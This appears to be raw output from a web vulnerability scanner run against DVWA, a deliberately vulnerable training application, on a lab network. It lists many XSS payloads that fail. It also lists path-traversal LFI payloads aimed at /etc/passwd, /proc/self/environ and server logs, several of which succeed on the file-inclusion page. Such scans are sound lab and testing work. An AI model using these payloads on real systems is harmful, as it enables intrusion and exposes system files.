+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'password_new' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'password_conf' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'Change' (GET) on http://10.0.2.4/DVWA/vulnerabilities/captcha using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'security' (GET) on http://10.0.2.4/DVWA/security.php using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'security' (GET) on http://10.0.2.4/DVWA/security.php using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'security' (GET) on http://10.0.2.4/DVWA/security.php using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'security' (GET) on http://10.0.2.4/DVWA/security.php using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'security' (GET) on http://10.0.2.4/DVWA/security.php using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'security' (GET) on http://10.0.2.4/DVWA/security.php using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'security' (GET) on http://10.0.2.4/DVWA/security.php using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'security' (GET) on http://10.0.2.4/DVWA/security.php using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'security' (GET) on http://10.0.2.4/DVWA/security.php using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'security' (GET) on http://10.0.2.4/DVWA/security.php using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'security' (GET) on http://10.0.2.4/DVWA/security.php using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'security' (GET) on http://10.0.2.4/DVWA/security.php using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'security' (GET) on http://10.0.2.4/DVWA/security.php using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'security' (GET) on http://10.0.2.4/DVWA/security.php using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'security' (GET) on http://10.0.2.4/DVWA/security.php using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'seclev_submit' (GET) on http://10.0.2.4/DVWA/security.php using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'seclev_submit' (GET) on http://10.0.2.4/DVWA/security.php using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'seclev_submit' (GET) on http://10.0.2.4/DVWA/security.php using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'seclev_submit' (GET) on http://10.0.2.4/DVWA/security.php using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'seclev_submit' (GET) on http://10.0.2.4/DVWA/security.php using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'seclev_submit' (GET) on http://10.0.2.4/DVWA/security.php using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'seclev_submit' (GET) on http://10.0.2.4/DVWA/security.php using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'seclev_submit' (GET) on http://10.0.2.4/DVWA/security.php using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'seclev_submit' (GET) on http://10.0.2.4/DVWA/security.php using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'seclev_submit' (GET) on http://10.0.2.4/DVWA/security.php using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'seclev_submit' (GET) on http://10.0.2.4/DVWA/security.php using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'seclev_submit' (GET) on http://10.0.2.4/DVWA/security.php using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'seclev_submit' (GET) on http://10.0.2.4/DVWA/security.php using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'seclev_submit' (GET) on http://10.0.2.4/DVWA/security.php using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'seclev_submit' (GET) on http://10.0.2.4/DVWA/security.php using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/security.php using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/security.php using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/security.php using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/security.php using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/security.php using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/security.php using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/security.php using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/security.php using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/security.php using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/security.php using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/security.php using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/security.php using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/security.php using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/security.php using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/security.php using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'include' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csp using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'include' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csp using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'include' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csp using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'include' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csp using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'include' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csp using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'include' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csp using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'include' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csp using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'include' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csp using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'include' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csp using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'include' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csp using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'include' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csp using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'include' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csp using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'include' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csp using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'include' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csp using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'include' (GET) on http://10.0.2.4/DVWA/vulnerabilities/csp using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'create_db' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'create_db' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'create_db' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'create_db' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'create_db' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'create_db' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'create_db' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'create_db' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'create_db' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'create_db' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'create_db' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'create_db' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'create_db' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'create_db' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'create_db' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'user_token' (GET) on http://10.0.2.4/DVWA/setup.php using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/instructions.php?doc=readme
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/README.fa.md
+[XSS] [!] Failed to fetch http://10.0.2.4/vulnerabilities/xss_r (Status Code: 404)
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/README.ko.md
+[LFI] [-] No parameters found in http://10.0.2.4/vulnerabilities/sqli
+[LFI] [-] No parameters found in http://10.0.2.4/vulnerabilities/csrf
+[LFI] [-] No parameters found in http://10.0.2.4/vulnerabilities/xss_s
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=../../../../etc/passwd
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=../../../../../../../../etc/passwd
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=/etc/passwd
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=../../../../../../../../windows/system32/drivers/etc/hosts
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=../../../../windows/win.ini
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=../../boot.ini
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=/proc/self/environ
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=../../../../../../../../proc/self/environ
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=../../../../../../../../var/log/apache2/access.log
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=../../../../../../../../var/log/httpd/access_log
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=../../../../../../../../var/log/httpd/error_log
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/README.zh.md
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/javascript
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/weak_id
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/README.es.md
+[LFI] [-] No parameters found in http://10.0.2.4/vulnerabilities/captcha
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/upload
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=../../../../etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=../../../../../../../../etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=/etc/passwd
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=../../../../../../../../windows/system32/drivers/etc/hosts
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=../../../../windows/win.ini
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=../../boot.ini
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=/proc/self/environ
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=../../../../../../../../proc/self/environ
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=../../../../../../../../var/log/apache2/access.log
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=../../../../../../../../var/log/httpd/access_log
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=../../../../../../../../var/log/httpd/error_log
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=../../../../etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=../../../../../../../../etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=/etc/passwd
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=../../../../../../../../windows/system32/drivers/etc/hosts
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=../../../../windows/win.ini
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=../../boot.ini
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=/proc/self/environ
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=../../../../../../../../proc/self/environ
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=../../../../../../../../var/log/apache2/access.log
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=../../../../../../../../var/log/httpd/access_log
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=../../../../../../../../var/log/httpd/error_log
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/README.ar.md
+[LFI] [-] No parameters found in http://10.0.2.4/vulnerabilities/upload
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=../../../../etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=../../../../../../../../etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=/etc/passwd
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=../../../../../../../../windows/system32/drivers/etc/hosts
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=../../../../windows/win.ini
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=../../boot.ini
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=/proc/self/environ
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=../../../../../../../../proc/self/environ
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=../../../../../../../../var/log/apache2/access.log
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=../../../../../../../../var/log/httpd/access_log
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=../../../../../../../../var/log/httpd/error_log
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/brute
+[LFI] [-] No parameters found in http://10.0.2.4/vulnerabilities/javascript
+[LFI] [-] No parameters found in http://10.0.2.4/vulnerabilities/open_redirect
+[LFI] [-] No parameters found in http://10.0.2.4/vulnerabilities/weak_id
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/authbypass
+[LFI] [-] No parameters found in http://10.0.2.4/vulnerabilities/exec
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/README.pt.md
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/sqli_blind
+[LFI] [-] No parameters found in http://10.0.2.4/instructions.php
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/README.fr.md
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/README.id.md
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/cryptography
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/xss_r
+[LFI] [-] No parameters found in http://10.0.2.4/setup.php
